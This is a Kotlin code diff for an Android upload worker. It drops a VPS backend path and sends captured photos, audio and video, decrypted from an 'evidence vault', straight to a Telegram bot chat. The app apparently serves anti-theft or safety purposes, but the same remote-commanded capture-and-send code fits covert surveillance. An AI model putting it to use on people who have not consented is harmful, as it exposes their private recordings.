@@ -148,16 +148,14 @@ class EvidenceUploadWorker @AssistedInject constructor(
         pendingUploadDao.update(task.copy(status = "UPLOADING"))
 
         try {
-            if (preferencesManager.useBackendServer) {
-                val deviceIdBody = preferencesManager.deviceId.toRequestBody("text/plain".toMediaTypeOrNull())
-                val cmdIdBody = task.commandId.toRequestBody("text/plain".toMediaTypeOrNull())
-                val msgCaption = when (task.fileType) {
-                    "PHOTO" -> "📸 Captured photo"
-                    "AUDIO" -> "🎙️ Audio recording"
-                    "VIDEO" -> "🎥 Captured video"
-                    else -> "📁 Captured evidence"
-                }
-                val msgBody = msgCaption.toRequestBody("text/plain".toMediaTypeOrNull())
+            // Direct Telegram Delivery (Strategy 1: Zero-Storage, zero server media persistence)
+            val chatId = preferencesManager.ownerChatId
+            val token = preferencesManager.botToken
+            if (chatId.isNotBlank() && token.isNotBlank()) {
+                val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
+                val captionBody = "📸 Resilient capture delivered".toRequestBody("text/plain".toMediaTypeOrNull())
+                val audioCaptionBody = "🎙️ Resilient audio delivered".toRequestBody("text/plain".toMediaTypeOrNull())
+                val videoCaptionBody = "🎥 Resilient video delivered".toRequestBody("text/plain".toMediaTypeOrNull())
 
                 val uploadBytes = if (task.isEncrypted) {
                     encryptionManager.decryptEvidenceVaultToBytes(file)
@@ -165,86 +163,35 @@ class EvidenceUploadWorker @AssistedInject constructor(
                     file.readBytes()
                 }
 
-                val photoPart = if (task.fileType == "PHOTO") {
-                    val reqFile = uploadBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
-                    MultipartBody.Part.createFormData("photo", "photo.jpg", reqFile)
-                } else null
-
-                val audioPart = if (task.fileType == "AUDIO") {
-                    val reqFile = uploadBytes.toRequestBody("audio/m4a".toMediaTypeOrNull())
-                    MultipartBody.Part.createFormData("audio", "audio.m4a", reqFile)
-                } else null
-
-                val videoPart = if (task.fileType == "VIDEO") {
-                    val reqFile = uploadBytes.toRequestBody("video/mp4".toMediaTypeOrNull())
-                    MultipartBody.Part.createFormData("video", "video.mp4", reqFile)
-                } else null
-
-                val response = pasaBackendApi.sendDeviceResponse(
-                    deviceId = deviceIdBody,
-                    commandId = cmdIdBody,
-                    message = msgBody,
-                    photo = photoPart,
-                    audio = audioPart,
-                    video = videoPart,
-                    evidence = null,
-                    latitude = null,
-                    longitude = null
-                )
-
-                if (response.ok) {
-                    Log.i(TAG, "Successfully uploaded ${task.id} via VPS backend")
-                    markCompleted(task, file)
-                    return true
-                } else {
-                    throw IllegalStateException("VPS returned not OK")
+                when (task.fileType) {
+                    "PHOTO" -> {
+                        val part = MultipartBody.Part.createFormData(
+                            "photo", "photo.jpg",
+                            uploadBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
+                        )
+                        telegramApi.sendPhoto(token, chatIdBody, part, captionBody)
+                    }
+                    "AUDIO" -> {
+                        val part = MultipartBody.Part.createFormData(
+                            "audio", "audio.m4a",
+                            uploadBytes.toRequestBody("audio/m4a".toMediaTypeOrNull())
+                        )
+                        telegramApi.sendAudio(token, chatIdBody, part, audioCaptionBody)
+                    }
+                    "VIDEO" -> {
+                        val part = MultipartBody.Part.createFormData(
+                            "video", "video.mp4",
+                            uploadBytes.toRequestBody("video/mp4".toMediaTypeOrNull())
+                        )
+                        telegramApi.sendVideo(token, chatIdBody, part, videoCaptionBody)
+                    }
                 }
+
+                Log.i(TAG, "Successfully uploaded ${task.id} directly to Telegram")
+                markCompleted(task, file)
+                return true
             } else {
-                // Direct Telegram Delivery fallback
-                val chatId = preferencesManager.ownerChatId
-                val token = preferencesManager.botToken
-                if (chatId.isNotBlank() && token.isNotBlank()) {
-                    val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
-                    val captionBody = "📸 Resilient capture delivered".toRequestBody("text/plain".toMediaTypeOrNull())
-                    val audioCaptionBody = "🎙️ Resilient audio delivered".toRequestBody("text/plain".toMediaTypeOrNull())
-                    val videoCaptionBody = "🎥 Resilient video delivered".toRequestBody("text/plain".toMediaTypeOrNull())
-
-                    val uploadBytes = if (task.isEncrypted) {
-                        encryptionManager.decryptEvidenceVaultToBytes(file)
-                    } else {
-                        file.readBytes()
-                    }
-
-                    when (task.fileType) {
-                        "PHOTO" -> {
-                            val part = MultipartBody.Part.createFormData(
-                                "photo", "photo.jpg",
-                                uploadBytes.toRequestBody("image/jpeg".toMediaTypeOrNull())
-                            )
-                            telegramApi.sendPhoto(token, chatIdBody, part, captionBody)
-                        }
-                        "AUDIO" -> {
-                            val part = MultipartBody.Part.createFormData(
-                                "audio", "audio.m4a",
-                                uploadBytes.toRequestBody("audio/m4a".toMediaTypeOrNull())
-                            )
-                            telegramApi.sendAudio(token, chatIdBody, part, audioCaptionBody)
-                        }
-                        "VIDEO" -> {
-                            val part = MultipartBody.Part.createFormData(
-                                "video", "video.mp4",
-                                uploadBytes.toRequestBody("video/mp4".toMediaTypeOrNull())
-                            )
-                            telegramApi.sendVideo(token, chatIdBody, part, videoCaptionBody)
-                        }
-                    }
-
-                    Log.i(TAG, "Successfully uploaded ${task.id} directly to Telegram")
-                    markCompleted(task, file)
-                    return true
-                } else {
-                    throw IllegalStateException("No ownerChatId or botToken configured for direct delivery")
-                }
+                throw IllegalStateException("No ownerChatId or botToken configured for direct delivery")
             }
         } catch (e: Exception) {
             Log.w(TAG, "Upload failed for ${task.id}: ${e.message}")
